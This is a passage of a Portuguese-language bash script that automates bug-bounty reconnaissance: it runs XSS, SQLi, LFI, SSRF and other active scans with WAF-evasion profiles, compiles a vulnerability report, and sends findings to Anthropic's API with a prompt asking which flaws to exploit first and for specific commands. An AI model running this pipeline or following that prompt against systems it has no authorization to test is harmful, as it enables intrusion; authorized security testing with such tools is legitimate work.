  findings+="=== Nuclei CRITICAL ($(count "$DIR_SCANS/nuclei_critical.txt")) ===\n"
  findings+="$(head -20 "$DIR_SCANS/nuclei_critical.txt" 2>/dev/null)\n\n"
  findings+="=== Nuclei HIGH ($(count "$DIR_SCANS/nuclei_high.txt")) ===\n"
  findings+="$(head -20 "$DIR_SCANS/nuclei_high.txt" 2>/dev/null)\n\n"
  findings+="=== Arquivos sensíveis ($(count "$DIR_EXTRA/sensitive_files.txt")) ===\n"
  findings+="$(head -10 "$DIR_EXTRA/sensitive_files.txt" 2>/dev/null)\n\n"
  findings+="=== CORS ($(count "$DIR_EXTRA/cors_vuln.txt")) | Takeover ($(count "$DIR_EXTRA/takeover.txt")) ===\n"
  findings+="$(head -5 "$DIR_EXTRA/cors_vuln.txt" 2>/dev/null)\n"
  findings+="=== Tecnologias detectadas ===\n"
  findings+="$(head -20 "$DIR_EXTRA/technologies.txt" 2>/dev/null)\n"

  log "Enviando para Anthropic API..."

  local ai_response
  ai_response=$(python3 - <<PYEOF
import json, urllib.request, sys

api_key = "$anthropic_api_key"
findings = """$findings"""

payload = {
    "model": "claude-sonnet-4-20250514",
    "max_tokens": 2000,
    "system": """Você é um especialista em segurança ofensiva e bug bounty.
Analise os findings de recon abaixo e produza:
1. TOP 3 vulnerabilidades mais críticas para explorar primeiro (com justificativa)
2. Análise de severidade de cada finding real confirmado
3. Próximos passos recomendados para cada vuln (comandos específicos quando possível)
4. False positives prováveis a descartar
5. Sugestão de vetores não testados com base nas tecnologias detectadas
Seja direto, técnico e conciso.""",
    "messages": [{"role": "user", "content": findings}]
}

req = urllib.request.Request(
    "https://api.anthropic.com/v1/messages",
    data=json.dumps(payload).encode(),
    headers={
        "Content-Type": "application/json",
        "x-api-key": api_key,
        "anthropic-version": "2023-06-01"
    }
)
try:
    with urllib.request.urlopen(req, timeout=60) as resp:
        data = json.loads(resp.read())
        print(data["content"][0]["text"])
except Exception as e:
    print(f"Erro na API: {e}", file=sys.stderr)
    sys.exit(1)
PYEOF
)

  if [[ -n "$ai_response" ]]; then
    echo "$ai_response" > "$DIR_REPORT/ai_triage.txt"
    success "AI Triage gerado → $DIR_REPORT/ai_triage.txt"
    echo
    echo -e "${BOLD}${LCYAN}══════════ AI TRIAGE REPORT ══════════${NC}"
    echo "$ai_response"
    echo -e "${BOLD}${LCYAN}═══════════════════════════════════════${NC}"
    echo
  else
    warn "AI Triage sem resposta — verifique a API key"
  fi
}

# ============================================================
# 20 — RELATÓRIO DE URLs VULNERÁVEIS
# ============================================================
step_vuln_report() {
  section "20 / RELATÓRIO DE URLs VULNERÁVEIS"

  local report="$DIR_REPORT/vuln_urls.txt"
  local report_json="$DIR_REPORT/vuln_urls.json"
  touch "$report"

  log "Consolidando todas as vulnerabilidades..."

  _section_to_report() {
    local title="$1" file="$2"
    if ! is_empty "$file"; then
      echo "================================================================" >> "$report"
      echo "  [$title]" >> "$report"
      echo "================================================================" >> "$report"
      cat "$file" >> "$report"
      echo >> "$report"
    fi
  }

  _section_to_report "XSS — Dalfox confirmado"         "$DIR_SCANS/dalfox.txt"
  _section_to_report "XSS — Manual pre-check"          "$DIR_SCANS/xss_manual.txt"
  _section_to_report "XSS — DOM-based (sinks JS)"      "$DIR_SCANS/xss_dom.txt"
  _section_to_report "XSS — Header injection"          "$DIR_SCANS/xss_headers.txt"
  _section_to_report "SQLi — SQLMap confirmado"        "$DIR_SCANS/sqli_confirmed.txt"
  _section_to_report "SQLi — Error-based pre-check"    "$DIR_SCANS/sqli_error_based.txt"
  _section_to_report "SQLi — Blind time-based"         "$DIR_SCANS/sqli_blind.txt"
  _section_to_report "SQLi — POST body"                "$DIR_SCANS/sqli_post.txt"
  _section_to_report "SQLi — Ghauri"                   "$DIR_SCANS/ghauri_results.txt"
  _section_to_report "IDOR — Parâmetros numéricos"     "$DIR_SCANS/idor_results.txt"
  _section_to_report "CRLF Injection"                  "$DIR_SCANS/crlf_results.txt"
  _section_to_report "Host Header Injection"           "$DIR_SCANS/host_injection_results.txt"
  _section_to_report "GraphQL introspection habilitada" "$DIR_SCANS/graphql_results.txt"
  _section_to_report "LFI CONFIRMADO"                  "$DIR_SCANS/lfi_results.txt"
  _section_to_report "SSTI CONFIRMADO"                 "$DIR_SCANS/ssti_results.txt"
  _section_to_report "SSRF CONFIRMADO"                 "$DIR_SCANS/ssrf_results.txt"
  _section_to_report "XXE CONFIRMADO"                  "$DIR_SCANS/xxe_results.txt"
  _section_to_report "NoSQL INJECTION"                 "$DIR_SCANS/nosql_results.txt"
  _section_to_report "OPEN REDIRECT"                   "$DIR_SCANS/redirect_results.txt"
  _section_to_report "CORS MISCONFIGURATION"           "$DIR_EXTRA/cors_vuln.txt"
  _section_to_report "NUCLEI — CRITICAL"               "$DIR_SCANS/nuclei_critical.txt"
  _section_to_report "NUCLEI — HIGH"                   "$DIR_SCANS/nuclei_high.txt"
  _section_to_report "SECRETS EM ARQUIVOS JS"          "$DIR_JS/js_secrets.txt"
  _section_to_report "SUBDOMAIN TAKEOVER"              "$DIR_EXTRA/takeover.txt"
  _section_to_report "ARQUIVOS SENSÍVEIS (200 OK)"     "$DIR_EXTRA/sensitive_files.txt"
  _section_to_report "WAF DETECTADO"                   "$DIR_EXTRA/waf_detected.txt"

  echo "================================================================" >> "$report"
  echo "  [CANDIDATOS DE ALTA PRIORIDADE — GF PATTERNS]"                 >> "$report"
  echo "  (não confirmados — revisar manualmente)"                        >> "$report"
  echo "================================================================" >> "$report"
  for vuln_type in rce ssrf ssti sqli xss lfi idor; do
    local f="$DIR_VULNS/${vuln_type}.txt"
    if ! is_empty "$f"; then
      echo "" >> "$report"
      echo "  --- $vuln_type ($(count "$f") candidatos) ---" >> "$report"
      head -n 20 "$f" >> "$report"
      [[ $(count "$f") -gt 20 ]] && echo "  ... (ver $f)" >> "$report"
    fi
  done

  python3 - <<PYEOF > "$report_json" 2>/dev/null || true
import json

def read_lines(path, limit=None):
    try:
        with open(path) as f:
            lines = [l.strip() for l in f if l.strip()]
        return lines[:limit] if limit else lines
    except:
        return []

data = {
    "target": "${domain}",
    "scan_dir": "${scan_dir}",
    "version": "1.0",
    "confirmed_vulns": {
        "xss_dalfox":        read_lines("${DIR_SCANS}/dalfox.txt"),
        "xss_manual":        read_lines("${DIR_SCANS}/xss_manual.txt"),
        "xss_dom":           read_lines("${DIR_SCANS}/xss_dom.txt"),
        "xss_headers":       read_lines("${DIR_SCANS}/xss_headers.txt"),
        "sqli":              read_lines("${DIR_SCANS}/sqli_confirmed.txt"),
        "sqli_error_based":  read_lines("${DIR_SCANS}/sqli_error_based.txt"),
        "sqli_blind":        read_lines("${DIR_SCANS}/sqli_blind.txt"),
        "sqli_post":         read_lines("${DIR_SCANS}/sqli_post.txt"),
        "idor":              read_lines("${DIR_SCANS}/idor_results.txt"),
        "crlf":              read_lines("${DIR_SCANS}/crlf_results.txt"),
        "host_injection":    read_lines("${DIR_SCANS}/host_injection_results.txt"),
        "graphql":           read_lines("${DIR_SCANS}/graphql_results.txt"),
        "lfi":               read_lines("${DIR_SCANS}/lfi_results.txt"),
        "ssti":              read_lines("${DIR_SCANS}/ssti_results.txt"),
        "ssrf":              read_lines("${DIR_SCANS}/ssrf_results.txt"),
        "xxe":               read_lines("${DIR_SCANS}/xxe_results.txt"),
        "nosql":             read_lines("${DIR_SCANS}/nosql_results.txt"),
        "open_redirect":     read_lines("${DIR_SCANS}/redirect_results.txt"),
        "cors":              read_lines("${DIR_EXTRA}/cors_vuln.txt"),
        "takeover":          read_lines("${DIR_EXTRA}/takeover.txt"),
        "nuclei_critical":   read_lines("${DIR_SCANS}/nuclei_critical.txt"),
        "nuclei_high":       read_lines("${DIR_SCANS}/nuclei_high.txt"),
    },
    "high_interest_candidates": {
        "rce":  read_lines("${DIR_VULNS}/rce.txt", 50),
        "ssrf": read_lines("${DIR_VULNS}/ssrf.txt", 50),
        "ssti": read_lines("${DIR_VULNS}/ssti.txt", 50),
        "idor": read_lines("${DIR_VULNS}/idor.txt", 50),
    },
    "exposures": {
        "js_secrets":        read_lines("${DIR_JS}/js_secrets.txt"),
        "trufflehog":        read_lines("${DIR_JS}/trufflehog.txt"),
        "sensitive_files":   read_lines("${DIR_EXTRA}/sensitive_files.txt"),
        "admin_panels":      read_lines("${DIR_URLS}/urls_admin.txt", 100),
        "interesting_ports": read_lines("${DIR_DISC}/ports_interesting.txt"),
        "waf_detected":      read_lines("${DIR_EXTRA}/waf_detected.txt"),
    }
}

print(json.dumps(data, indent=2, ensure_ascii=False))
PYEOF

  # ── Contagens para painel ────────────────────────────────────
  local n_xss_dalfox n_xss_manual n_xss_dom n_xss_hdr
  local n_sqli n_sqli_eb n_sqli_bt n_sqli_post
  local n_idor n_crlf n_host_inj n_graphql
  local n_lfi n_ssti n_ssrf n_xxe n_nosql n_redir n_cors
  local n_crit n_high n_secrets n_takeover n_sensitive n_admin
  local total_confirmed

  n_xss_dalfox=$(grep -c "https\?://" "$DIR_SCANS/dalfox.txt" 2>/dev/null || echo 0)
  n_xss_manual=$(count "$DIR_SCANS/xss_manual.txt")
  n_xss_dom=$(count "$DIR_SCANS/xss_dom.txt")
  n_xss_hdr=$(count "$DIR_SCANS/xss_headers.txt")
  n_sqli=$(count "$DIR_SCANS/sqli_confirmed.txt")
  n_sqli_eb=$(count "$DIR_SCANS/sqli_error_based.txt")
  n_sqli_bt=$(count "$DIR_SCANS/sqli_blind.txt")
  n_sqli_post=$(count "$DIR_SCANS/sqli_post.txt")
  n_idor=$(count "$DIR_SCANS/idor_results.txt")
  n_crlf=$(count "$DIR_SCANS/crlf_results.txt")
  n_host_inj=$(count "$DIR_SCANS/host_injection_results.txt")
  n_graphql=$(count "$DIR_SCANS/graphql_results.txt")
  n_lfi=$(count "$DIR_SCANS/lfi_results.txt")
  n_ssti=$(count "$DIR_SCANS/ssti_results.txt")
  n_ssrf=$(count "$DIR_SCANS/ssrf_results.txt")
  n_xxe=$(count "$DIR_SCANS/xxe_results.txt")
  n_nosql=$(count "$DIR_SCANS/nosql_results.txt")
  n_redir=$(grep -c "REDIRECT VULN" "$DIR_SCANS/redirect_results.txt" 2>/dev/null || echo 0)
  n_cors=$(grep -c "CORS" "$DIR_EXTRA/cors_vuln.txt" 2>/dev/null || echo 0)
  n_crit=$(count "$DIR_SCANS/nuclei_critical.txt")
  n_high=$(count "$DIR_SCANS/nuclei_high.txt")
  n_secrets=$(count "$DIR_JS/js_secrets.txt")
  n_takeover=$(count "$DIR_EXTRA/takeover.txt")
  n_sensitive=$(grep -c "^\[200\]" "$DIR_EXTRA/sensitive_files.txt" 2>/dev/null || echo 0)
  n_admin=$(count "$DIR_URLS/urls_admin.txt")
  total_confirmed=$(( n_xss_dalfox + n_xss_manual + n_xss_dom + n_xss_hdr
    + n_sqli + n_sqli_eb + n_sqli_bt + n_sqli_post
    + n_idor + n_crlf + n_host_inj + n_graphql
    + n_lfi + n_ssti + n_ssrf + n_xxe + n_nosql
    + n_redir + n_cors + n_crit + n_high ))

  echo | tee -a "$log_file"
  echo -e "${BOLD}${LRED}" | tee -a "$log_file"
  echo "  ╔══════════════════════════════════════════════════════════════╗" | tee -a "$log_file"
  echo "  ║         VULNERABILIDADES ENCONTRADAS — v1.0                 ║" | tee -a "$log_file"
  echo "  ╠══════════════════════════════════════════════════════════════╣" | tee -a "$log_file"
  echo -e "${NC}${BOLD}" | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "XSS Dalfox (confirmado):"     "$n_xss_dalfox"  | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "XSS Manual pre-check:"        "$n_xss_manual"  | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "XSS DOM-based:"               "$n_xss_dom"     | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "XSS Header-based:"            "$n_xss_hdr"     | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "SQLi (sqlmap confirmado):"    "$n_sqli"         | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "SQLi error-based (pre-check):" "$n_sqli_eb"    | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "SQLi blind time-based:"       "$n_sqli_bt"     | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "SQLi POST body:"              "$n_sqli_post"   | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "IDOR:"                        "$n_idor"         | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "CRLF Injection:"              "$n_crlf"         | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "Host Header Injection:"       "$n_host_inj"    | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "GraphQL introspection:"       "$n_graphql"     | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "LFI:"                         "$n_lfi"          | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "SSTI:"                        "$n_ssti"         | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "SSRF:"                        "$n_ssrf"         | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "XXE:"                         "$n_xxe"          | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "NoSQL:"                       "$n_nosql"        | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "Open Redirect:"               "$n_redir"        | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "CORS vuln:"                   "$n_cors"         | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "Nuclei CRITICAL:"             "$n_crit"         | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "Nuclei HIGH:"                 "$n_high"         | tee -a "$log_file"
  echo "  ╠══════════════════════════════════════════════════════════════╣" | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "Secrets em JS:"               "$n_secrets"     | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "Arquivos sensíveis:"          "$n_sensitive"   | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "Subdomain takeover:"          "$n_takeover"    | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "Admin panels:"                "$n_admin"        | tee -a "$log_file"
  echo "  ╠══════════════════════════════════════════════════════════════╣" | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "TOTAL CONFIRMADOS + SUSPEITOS:" "$total_confirmed" | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "Relatório TXT:"               "$report"        | tee -a "$log_file"
  printf "  ║  %-40s %-19s ║\n" "Relatório JSON:"              "$report_json"   | tee -a "$log_file"
  echo "  ╚══════════════════════════════════════════════════════════════╝" | tee -a "$log_file"
  echo -e "${NC}" | tee -a "$log_file"

  if [[ $total_confirmed -gt 0 ]]; then
    error "⚠  $total_confirmed findings! Veja: $report"
  else
    info "Nenhuma vuln diretamente confirmada. Analise candidatos GF manualmente."
  fi
}

# ============================================================
# RESUMO FINAL
# ============================================================
final_summary() {
  section "SCAN COMPLETO"

  local scan_end
  scan_end=$(date +%s)
  local elapsed=$(( scan_end - scan_start ))
  local elapsed_fmt
  elapsed_fmt=$(printf '%02dh %02dm %02ds' $((elapsed/3600)) $((elapsed%3600/60)) $((elapsed%60)))

  local errors_count
  errors_count=$(grep -c "" "$error_log" 2>/dev/null || echo 0)

  echo | tee -a "$log_file"
  echo -e "${BOLD}${LCYAN}" | tee -a "$log_file"
  echo "  ╔══════════════════════════════════════════════════════════════╗" | tee -a "$log_file"
  echo "  ║              RECON v1.0 FINALIZADO — RESUMO                 ║" | tee -a "$log_file"
  echo "  ╠══════════════════════════════════════════════════════════════╣" | tee -a "$log_file"
  printf "  ║  %-30s %-29s ║\n" "Alvo:"        "$domain"      | tee -a "$log_file"
  printf "  ║  %-30s %-29s ║\n" "Duração:"     "$elapsed_fmt" | tee -a "$log_file"
  printf "  ║  %-30s %-29s ║\n" "Deep mode:"   "$deep_mode"   | tee -a "$log_file"
  printf "  ║  %-30s %-29s ║\n" "Erros log:"   "$errors_count linhas" | tee -a "$log_file"
  echo "  ╠══════════════════════════════════════════════════════════════╣" | tee -a "$log_file"
  printf "  ║  %-30s %-29s ║\n" "Subdomínios:"     "$(count "$DIR_DISC/subs_all.txt")"       | tee -a "$log_file"
  printf "  ║  %-30s %-29s ║\n" "Hosts ativos:"    "$(count "$DIR_DISC/alive.txt")"          | tee -a "$log_file"
  printf "  ║  %-30s %-29s ║\n" "URLs coletadas:"  "$(count "$DIR_URLS/urls_all.txt")"       | tee -a "$log_file"
  printf "  ║  %-30s %-29s ║\n" "Parâmetros:"      "$(count "$DIR_PARAMS/params.txt")"       | tee -a "$log_file"
  printf "  ║  %-30s %-29s ║\n" "Arquivos JS:"     "$(count "$DIR_JS/js_files.txt")"         | tee -a "$log_file"
  printf "  ║  %-30s %-29s ║\n" "Pasta do scan:"   "$scan_dir"                               | tee -a "$log_file"
  echo "  ╚══════════════════════════════════════════════════════════════╝" | tee -a "$log_file"
  echo -e "${NC}" | tee -a "$log_file"

  echo -e "${BOLD}  ESTRUTURA:${NC}"
  echo -e "  ${CYAN}${scan_dir}/${NC}"
  echo -e "  ├── ${GREEN}01_discovery/${NC}    subdomínios, hosts, ports"
  echo -e "  ├── ${GREEN}02_urls/${NC}         URLs (wayback+gau+katana)"
  echo -e "  ├── ${GREEN}03_params/${NC}       parâmetros, arjun"
  echo -e "  ├── ${GREEN}04_vulns/${NC}        candidatos gf"
  echo -e "  ├── ${GREEN}05_scans/${NC}        xss, sqli (4 métodos), idor, crlf, host_inj, graphql"
  echo -e "  │                lfi, ssti, ssrf, xxe, nosql, nuclei (retry+mutation v1)"
  echo -e "  ├── ${GREEN}06_screenshots/${NC}  capturas"
  echo -e "  ├── ${GREEN}07_js/${NC}           JS, endpoints, secrets, trufflehog"
  echo -e "  ├── ${GREEN}08_extra/${NC}        CORS, headers, ffuf, takeover, WAF, sensíveis"
  echo -e "  └── ${GREEN}09_report/${NC}       vuln_urls.txt + vuln_urls.json + ai_triage.txt"
  echo
  success "Tudo salvo em: $(pwd)/$scan_dir"
  echo
}

# ============================================================
# MAIN
# ============================================================
main() {
  scan_start=$(date +%s)
  WAF_DETECTED=false

  parse_args "$@"

  # Aplica scan_profile definido via --stealth ou --aggressive
  if [[ "$scan_profile" == "stealth" ]]; then
    jitter_mode=true; waf_evasion=true; curl_delay=2; burst_pause=5
    max_dalfox_workers=5; threads=20; gau_threads=5; katana_depth=2
    limit_cors=10; limit_headers=10; limit_sensitive=5; limit_lfi=10
    limit_redirect=10; limit_idor=10; limit_crlf=10; limit_xss_manual=15; max_sqli=10
  elif [[ "$scan_profile" == "aggressive" ]]; then
    threads=200; gau_threads=30; katana_depth=6
    max_sqli=100; limit_cors=300; limit_headers=200; limit_sensitive=200
    limit_lfi=200; limit_redirect=200; limit_idor=100; limit_crlf=100
    limit_xss_manual=300; max_dalfox_workers=50
  fi

  # v1.0: modo instalação — dispara auto_install antes de qualquer coisa
  if [[ "$install_mode" == "true" ]]; then
    banner
    auto_install
    # auto_install faz exit 0 internamente
  fi

  banner
  setup_dirs

  echo -e "  ${BOLD}Alvo     :${NC} ${LCYAN}${domain}${NC}"
  echo -e "  ${BOLD}Threads  :${NC} ${threads}"
  echo -e "  ${BOLD}Deep mode:${NC} ${deep_mode}"
  echo -e "  ${BOLD}Retry    :${NC} ${max_retries}x (backoff ${retry_delay}s)"
  echo -e "  ${BOLD}Jitter   :${NC} $( [[ "$jitter_mode" == "true" ]] && echo "ativado (anti-WAF)" || echo "auto (ativa com WAF)" )"
  echo -e "  ${BOLD}WAF Evasion:${NC} $( [[ "$waf_evasion" == "true" ]] && echo "ativado (payload mutation)" || echo "desativado" )"
  echo -e "  ${BOLD}AI Triage:${NC} $( [[ -n "$anthropic_api_key" ]] && echo "ativado" || echo "desativado (use --api-key)" )"
  echo -e "  ${BOLD}Adaptive :${NC} $( [[ "$adaptive_mode" == "true" ]] && echo "ativado (auto-tuning via WAF response)" || echo "desativado" )"
  echo -e "  ${BOLD}Passive  :${NC} $( [[ "$passive_intel" == "true" ]] && echo "ativado (crt.sh, ASN, BGP)" || echo "desativado" )"
  echo -e "  ${BOLD}Scoring  :${NC} $( [[ "$endpoint_scoring" == "true" ]] && echo "ativado (endpoints priorizados por risco)" || echo "desativado" )"
  echo -e "  ${BOLD}Profile  :${NC} ${scan_profile}"
  echo -e "  ${BOLD}Scans    :${NC} $( [[ "$skip_scans" == "true" ]] && echo "desativados" || echo "ativados" )"
  echo -e "  ${BOLD}Pasta    :${NC} ${CYAN}${scan_dir}${NC}"
  echo

  check_deps

  step_subdomains
  step_passive_intel    # NOVO: passive intel (crt.sh, ASN, BGP, Shodan)
  step_alive
  step_ports
  step_screenshots
  step_takeover
  step_urls
  step_filter_urls
  step_waf_detect
  adapt_to_waf          # NOVO: adapta estratégia dinamicamente ao WAF detectado

  # NOVO: prioriza endpoints por score de risco antes dos scans
  if [[ "$endpoint_scoring" == "true" ]]; then
    info "🎯 Priorizando endpoints por score de risco..."
    prioritize_targets "$DIR_PARAMS/params_alive.txt" "$DIR_PARAMS/params_alive_scored.txt"
    [[ -s "$DIR_PARAMS/params_alive_scored.txt" ]] && \
      cp "$DIR_PARAMS/params_alive_scored.txt" "$DIR_PARAMS/params_alive.txt"

    prioritize_targets "$DIR_URLS/urls_clean.txt" "$DIR_URLS/urls_clean_scored.txt"
    [[ -s "$DIR_URLS/urls_clean_scored.txt" ]] && \
      cp "$DIR_URLS/urls_clean_scored.txt" "$DIR_URLS/urls_clean.txt"
  fi

  step_js
  step_params
  step_gf
  step_ffuf
  step_cors
  burst_sleep           # pausa anti-WAF entre blocos
  step_headers
  step_sensitive

  if [[ "$skip_scans" != "true" ]]; then
    step_xss
    burst_sleep
    step_sqli
    burst_sleep
    step_lfi
    step_redirect
    step_nosql
    burst_sleep
    step_ssti_active
    step_ssrf_active
    step_xxe
    burst_sleep
    step_idor
    step_crlf
    step_host_injection
    step_graphql
    step_nuclei
    step_ai_triage
  else
    warn "Scans ativos pulados via --skip-scans"
    touch \
      "$DIR_SCANS/dalfox.txt"               "$DIR_SCANS/xss_manual.txt" \
      "$DIR_SCANS/xss_dom.txt"              "$DIR_SCANS/xss_headers.txt" \
      "$DIR_SCANS/xss_all_targets.txt"      \
      "$DIR_SCANS/sqli_confirmed.txt"       "$DIR_SCANS/sqli_error_based.txt" \
      "$DIR_SCANS/sqli_blind.txt"           "$DIR_SCANS/sqli_post.txt" \
      "$DIR_SCANS/sqli_all_targets.txt"     "$DIR_SCANS/ghauri_results.txt" \
      "$DIR_SCANS/lfi_results.txt"          "$DIR_SCANS/redirect_results.txt" \
      "$DIR_SCANS/ssti_results.txt"         "$DIR_SCANS/ssrf_results.txt" \
      "$DIR_SCANS/xxe_results.txt"          "$DIR_SCANS/nosql_results.txt" \
      "$DIR_SCANS/idor_results.txt"         "$DIR_SCANS/idor_candidates.txt" \
      "$DIR_SCANS/crlf_results.txt"         "$DIR_SCANS/host_injection_results.txt" \
      "$DIR_SCANS/graphql_results.txt"      \
      "$DIR_SCANS/nuclei_all.txt"           "$DIR_SCANS/nuclei_critical.txt" \
      "$DIR_SCANS/nuclei_high.txt"          "$DIR_SCANS/nuclei_medium.txt"
  fi

  step_vuln_report
  final_summary
}

main "$@"
